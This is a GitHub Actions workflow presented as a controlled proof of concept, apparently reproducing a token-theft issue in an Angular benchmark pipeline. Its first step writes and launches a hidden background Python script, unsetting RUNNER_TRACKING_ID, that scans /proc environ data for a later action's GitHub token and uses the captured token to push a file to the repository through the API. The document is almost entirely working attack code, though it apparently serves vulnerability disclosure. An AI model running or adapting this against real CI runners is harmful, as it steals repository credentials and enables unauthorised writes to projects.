name: Angular later-action token process PoC

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

jobs:
  reproduce:
    runs-on: ubuntu-latest
    steps:
      - name: Start attacker process from the untrusted-code step
        shell: bash
        run: |
          cat >"$RUNNER_TEMP/watch-later-action.py" <<'PY'
          import base64
          import json
          import os
          import sys
          import time
          import urllib.error
          import urllib.request

          repository, run_id = sys.argv[1:]
          marker_path = f"angular-later-action-token-{run_id}.txt"
          deadline = time.monotonic() + 45
          seen = set()

          while time.monotonic() < deadline:
              for entry in os.scandir("/proc"):
                  if not entry.name.isdigit() or entry.name in seen:
                      continue
                  try:
                      data = open(f"/proc/{entry.name}/environ", "rb").read()
                  except (FileNotFoundError, PermissionError, ProcessLookupError):
                      continue
                  token = None
                  for item in data.split(b"\0"):
                      if item.startswith(b"INPUT_TOKEN=ghs_"):
                          token = item.removeprefix(b"INPUT_TOKEN=").decode()
                          break
                  if token is None:
                      continue

                  body = {
                      "message": "Controlled proof: later action token was readable",
                      "content": base64.b64encode(
                          f"captured_from_later_action=true\nrun_id={run_id}\n".encode()
                      ).decode(),
                  }
                  request = urllib.request.Request(
                      f"https://api.github.com/repos/{repository}/contents/{marker_path}",
                      data=json.dumps(body).encode(),
                      method="PUT",
                      headers={
                          "Accept": "application/vnd.github+json",
                          "Authorization": f"Bearer {token}",
                          "Content-Type": "application/json",
                          "User-Agent": "controlled-angular-process-poc",
                          "X-GitHub-Api-Version": "2022-11-28",
                      },
                  )
                  try:
                      with urllib.request.urlopen(request, timeout=10) as response:
                          if response.status == 201:
                              open(f"/tmp/angular-proc-poc-{run_id}.ok", "w").write(marker_path)
                              raise SystemExit(0)
                  except urllib.error.HTTPError as error:
                      open(f"/tmp/angular-proc-poc-{run_id}.error", "a").write(
                          f"{entry.name}: HTTP {error.code}\n"
                      )
                  seen.add(entry.name)
              time.sleep(0.002)
          raise SystemExit(1)
          PY

          env -u RUNNER_TRACKING_ID nohup \
            python3 "$RUNNER_TEMP/watch-later-action.py" "$GITHUB_REPOSITORY" "$GITHUB_RUN_ID" \
            >"$RUNNER_TEMP/watch-later-action.log" 2>&1 &

      - name: Exact secret-bearing action used after Angular benchmark code
        uses: peter-evans/create-or-update-comment@e8674b075228eee787fea43ef493e45ece1004c9 # v5
        with:
          issue-number: 8
          token: ${{ github.token }}
          body: |
            Controlled run ${{ github.run_id }} reached the later token-bearing action.

      - name: Verify token-powered write from the surviving attacker process
        shell: bash
        run: |
          for attempt in {1..30}; do
            if [[ -f "/tmp/angular-proc-poc-${GITHUB_RUN_ID}.ok" ]]; then
              path="$(cat "/tmp/angular-proc-poc-${GITHUB_RUN_ID}.ok")"
              gh api "repos/${GITHUB_REPOSITORY}/contents/${path}" --jq '.content' | base64 -d
              exit 0
            fi
            sleep 1
          done
          cat "$RUNNER_TEMP/watch-later-action.log" || true
          cat "/tmp/angular-proc-poc-${GITHUB_RUN_ID}.error" || true
          exit 1
        env:
          GH_TOKEN: ${{ github.token }}
